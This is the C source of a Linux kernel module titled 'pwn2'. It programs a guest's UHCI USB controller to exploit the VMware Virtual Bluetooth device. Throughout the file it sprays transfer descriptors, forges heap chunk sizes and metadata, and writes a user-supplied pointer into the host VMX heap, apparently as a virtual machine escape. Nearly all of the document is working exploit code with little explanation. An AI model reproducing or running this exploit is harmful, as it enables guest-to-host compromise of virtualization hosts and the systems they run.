#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros

#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/moduleparam.h>
#include <linux/scatterlist.h>
#include <linux/mutex.h>
#include <linux/timer.h>
#include <linux/usb.h>
#include <linux/usb/ch9.h>
#include <linux/usb/hcd.h>
#include <linux/mount.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/delay.h>
#include <linux/dmapool.h>
#include <linux/kallsyms.h>
#include <linux/vmw_vmci_defs.h>
#include "uhci-hcd.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("?");
MODULE_DESCRIPTION("pwn2");
        
#define uhci_myendpoint(x) (x << 15)

#define DEVICEADDR 0x00000400

#define POOL_SIZE 0x6200 

static char *vmxwrite = NULL;
module_param(vmxwrite,charp,0660);

struct uhci_qh *g_frames[1024];
static struct dma_pool * mypool;
static struct dma_pool * setuppool;
static struct dma_pool * tdpool;
static struct dma_pool * qhpool;

static void uhci_generic_reset_hc(struct uhci_hcd *uhci)
{
    /* Reset the HC - this will force us to get a
     * new notification of any already connected
     * ports due to the virtual disconnect that it
     * implies.
     */
    uhci_writew(uhci, USBCMD_HCRESET, USBCMD);
    mb();
    udelay(5);
    if (uhci_readw(uhci, USBCMD) & USBCMD_HCRESET)
        dev_warn(uhci_dev(uhci), "HCRESET not completed yet!\n");
    /* Just to be safe, disable interrupt requests and
     * make sure the controller is stopped.
     */
    uhci_writew(uhci, 0, USBINTR);
    uhci_writew(uhci, 0, USBCMD);
}

static int uhci_generic_check_and_reset_hc(struct uhci_hcd *uhci)
{
    unsigned int cmd, intr;
    /*
     * When restarting a suspended controller, we expect all the
     * settings to be the same as we left them:
     *
     *  Controller is stopped and configured with EGSM set;
     *  No interrupts enabled except possibly Resume Detect.
     *
     * If any of these conditions are violated we do a complete reset.
     */
    cmd = uhci_readw(uhci, USBCMD);
    if ((cmd & USBCMD_RS) || !(cmd & USBCMD_CF) || !(cmd & USBCMD_EGSM)) {
        dev_dbg(uhci_dev(uhci), "%s: cmd = 0x%04x\n",
                __func__, cmd);
        goto reset_needed;
    }
    intr = uhci_readw(uhci, USBINTR);
    if (intr & (~USBINTR_RESUME)) {
        dev_dbg(uhci_dev(uhci), "%s: intr = 0x%04x\n",
                __func__, intr);
        goto reset_needed;
    }
    return 0;
reset_needed:
    dev_dbg(uhci_dev(uhci), "Performing full reset\n");
    uhci_generic_reset_hc(uhci);
    return 1;
}

static struct uhci_td *uhci_alloc_td(struct uhci_hcd *uhci)
{
	dma_addr_t dma_handle;
	struct uhci_td *td;

	td = dma_pool_alloc(tdpool, GFP_KERNEL, &dma_handle);
	if (!td)
		return NULL;

	td->dma_handle = dma_handle;
	td->frame = -1;

	// set terminate bit, null out the rest of the field
	td->link = 1;

	return td;
}

static struct uhci_qh *uhci_alloc_qh(struct uhci_hcd *uhci)
{
    dma_addr_t dma_handle;
    struct uhci_qh *qh;

    qh = dma_pool_zalloc(qhpool, GFP_KERNEL, &dma_handle);

    qh->dma_handle = dma_handle;

    qh->element = UHCI_PTR_TERM(uhci);
    qh->link = UHCI_PTR_TERM(uhci);

    qh->dummy_td = uhci_alloc_td(uhci);

	qh->type = USB_ENDPOINT_XFER_BULK;
    return qh;
}

static inline void uhci_fill_td(struct uhci_hcd *uhci, struct uhci_td *td,
		u32 status, u32 token, u32 buffer)
{
	td->status = cpu_to_hc32(uhci, status);
	td->token = cpu_to_hc32(uhci, token);
	td->buffer = cpu_to_hc32(uhci, buffer);
}

__hc32 uhci_submit_control(struct uhci_hcd *uhci, dma_addr_t data,
		int len, dma_addr_t setupdata, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink = NULL;
	__hc32 retval = 0;
	unsigned int toggle = 1;

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

	td = qh->dummy_td;
	uhci_fill_td(uhci, td, status,
                uhci_endpoint(3) |
				DEVICEADDR | uhci_explen(8) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT) | USB_PID_SETUP,
				setupdata);
	plink = &td->link;

	/*
	 * Build the DATA TDs
	 */
	while (len > 0) {	/* Allow zero length packets */
		int pktsze = 0x20;
        toggle ^= 1;
		if (len <= pktsze) {		/* The last packet */
			pktsze = len;
		}

        td = uhci_alloc_td(uhci);

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_endpoint(3) |
				DEVICEADDR | uhci_explen(pktsze) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT) | USB_PID_OUT,
				data);
        *plink = LINK_TO_TD(uhci, td);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

		data += pktsze;
		len -= pktsze;
	}

    toggle ^= 1;

	/*
	 * Build the new dummy TD and activate the old one
	 */
	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_IN | uhci_explen(0) | (toggle << TD_TOKEN_TOGGLE_SHIFT), 0);
	wmb();
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = uhci_alloc_td(uhci);

	return retval;

}

__hc32 uhci_setup_pwn(struct uhci_hcd *uhci, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink;
	__hc32 retval = 0;
	unsigned int toggle = 0;
    int x = 0, added_tds = 0;
		
    dma_addr_t data = 0;
    u8 * dma_vaddr = dma_pool_alloc(mypool, GFP_KERNEL, &data);
    memset(dma_vaddr, 0x42, POOL_SIZE);

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

    // spray 0x18 TDs of size 0x100
	plink = NULL;
	td = qh->dummy_td;

	for(x = 0; x < 0x18; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x100) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

        data += 0x100;
        dma_vaddr += 0x100;
        added_tds++;
	}

    memset(dma_vaddr, 0x00, 0x400);
    memset(dma_vaddr, 0x43, 0x70);
    dma_vaddr[0x78] = 0xa0; dma_vaddr[0x79] = 0x18;

    // we are actually gonna fake this chunk size so it looks bigger than it really is
    dma_vaddr[0x80] = 0x21; dma_vaddr[0x81] = 0x14;
    //dma_vaddr[0x80] = 0xe1; dma_vaddr[0x81] = 0x3;

    // this TD is overlapping the heap metadata
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x88) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

        added_tds++;
        data += 0x88;
        dma_vaddr += 0x88;
    }

    // this TD overlaps the full cmdlineargs chunk
    memset(dma_vaddr, 0x44, 0x3e0);
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x3e0) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x3e0;
        dma_vaddr += 0x3e0;
    }

    // spray 2 more TDs of size of (0x810/2) to fill up the remaining space
    memset(dma_vaddr, 0x44, 0x78);
    for(x = 0; x < 1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x78) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x78;
        dma_vaddr += 0x78;
    }

    // fill up the allocated chunk 
    memset(dma_vaddr, 0x45, 0x1100);
    for(x = 0; x < 0x11; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x100) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x100;
        dma_vaddr += 0x100;
    }

    // fill up the remainder of the chunk
    memset(dma_vaddr, 0x46, 0xc0);
    for(x = 0; x < 0x1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0xc0) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0xc0;
        dma_vaddr += 0xc0;
    }

    // skip the chunk pointers
    memset(dma_vaddr, 0x00, 0x8);
    dma_vaddr[0] = 0x1;
    dma_vaddr += 0x8;

    // grab the value from our arguments
    u64 vmxptr = 0;
    kstrtoull(vmxwrite, 0, &vmxptr);

    // write the chunk to this location
    memcpy(dma_vaddr, &vmxptr, 8);
    memcpy(dma_vaddr+8, &vmxptr, 8);
    memcpy(dma_vaddr+0x10, &vmxptr, 8);
    for(x = 0; x < 0x1; x++) {
		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0x20) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        added_tds++;
        data += 0x20;
        dma_vaddr += 0x20;
    }

    // remaining TDs all have data lengths of 0
    for(x = 0; x < (0x62 - added_tds); x++) {

		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(0) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;
        data += 0x100;
        dma_vaddr += 0x100;
    }

	/*
	 * Build the new dummy TD and activate the old one
	 */

	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_OUT | uhci_explen(0), 0);
	wmb();
	qh->dummy_td->status |= cpu_to_hc32(uhci, TD_CTRL_ACTIVE);
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = td;

	return retval;

}

__hc32 uhci_submit_bulk2(struct uhci_hcd *uhci, dma_addr_t data,
		int len, struct uhci_qh *qh)
{
	struct uhci_td *td;
	unsigned long status;
	__hc32 *plink;
	__hc32 retval = 0;
	unsigned int toggle = 0;

	/* 3 errors, dummy TD remains inactive */
#define uhci_maxerr(err)		((err) << TD_CTRL_C_ERR_SHIFT)
	status = uhci_maxerr(3) | TD_CTRL_ACTIVE;

	/*
	 * Build the DATA TDs
	 */
	plink = NULL;
	td = qh->dummy_td;
	while (len > 0) {	/* Allow zero length packets */
		int pktsze = 0x100;
		if (len <= pktsze) {		/* The last packet */
			pktsze = len;
		}

		if (plink) {
			td = uhci_alloc_td(uhci);
			*plink = LINK_TO_TD(uhci, td);
		}

        // this endpoint corresponds to the vmware Virtual Bluetooth device
		uhci_fill_td(uhci, td, status,
                uhci_myendpoint(0x2) | USB_PID_OUT |
				DEVICEADDR | uhci_explen(pktsze) |
					(toggle << TD_TOKEN_TOGGLE_SHIFT),
				data);
		plink = &td->link;
		status |= TD_CTRL_ACTIVE;

		data += pktsze;
		len -= pktsze;
	}

	/*
	 * Build the new dummy TD and activate the old one
	 */

	td = uhci_alloc_td(uhci);
	*plink = LINK_TO_TD(uhci, td);

	uhci_fill_td(uhci, td, 0, USB_PID_OUT | uhci_explen(0), 0);
	wmb();
	qh->dummy_td->status |= cpu_to_hc32(uhci, TD_CTRL_ACTIVE);
	retval = qh->dummy_td->dma_handle;
	qh->dummy_td = td;

	return retval;

}

static int __init pwn2_init(void)
{
        int x = 0;

        char mydata[0x20] = {};
        memset(mydata, 0x41, sizeof(mydata));

        struct vmci_datagram mydg;
        memset(&mydg, 0x41, sizeof(mydg));

        if (vmxwrite == NULL) {
            return 1;
        }

        printk("we out here doing umh and shit, part 2\n");
 
        // get inode
        char *path_name = "/sys/kernel/debug/usb/uhci/0000:02:00.0";
        struct inode *inode = NULL;
        struct path path = {};
        kern_path(path_name, LOOKUP_FOLLOW, &path);
        inode = path.dentry->d_inode;
        struct uhci_hcd *uhci = inode->i_private;

		tdpool = dma_pool_create("uhci_td22", uhci_dev(uhci),
				sizeof(struct uhci_td), 16, 0);

		qhpool = dma_pool_create("uhci_qh22", uhci_dev(uhci),
				sizeof(struct uhci_qh), 16, 0);
        
		// set up my dma pool
		mypool = dma_pool_create("uhci-data2", uhci_dev(uhci),
			POOL_SIZE, 16, 0);
		setuppool = dma_pool_create("uhci-setupdata2", uhci_dev(uhci),
			0x10, 16, 0);

        // disable uhci processing
        uhci_writew(uhci, 0, USBCMD);

        // set uhci frame number to 0
        uhci_writew(uhci, 0, USBFRNUM);
        msleep(5);

		dma_addr_t setupdata = 0;
		u8 * setup_dma_vaddr = dma_pool_alloc(setuppool, GFP_KERNEL, &setupdata);
		memset(setup_dma_vaddr, 0, 0x10);
		*(u16 *)&setup_dma_vaddr[6] = 0x100;

        for(x = 0; x < 1024; x++) {
            uhci->frame[x] = 1;
        }

        g_frames[0] = uhci_alloc_qh(uhci);

        __hc32 mytd = uhci_setup_pwn(uhci, g_frames[0]);
        
        local_irq_disable();
        
        uhci->frame[0] = mytd;

        uhci_writew(uhci, USBCMD_RS | USBCMD_CF | USBCMD_MAXP, USBCMD);
        wmb();
		msleep(500);
        uhci_writew(uhci, 0, USBCMD);
        wmb();
		msleep(5);

        local_irq_enable();
        return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit pwn2_cleanup(void)
{
	    printk(KERN_INFO "Cleaning up module.\n");
		dma_pool_destroy(mypool);
}

module_init(pwn2_init);
module_exit(pwn2_cleanup);
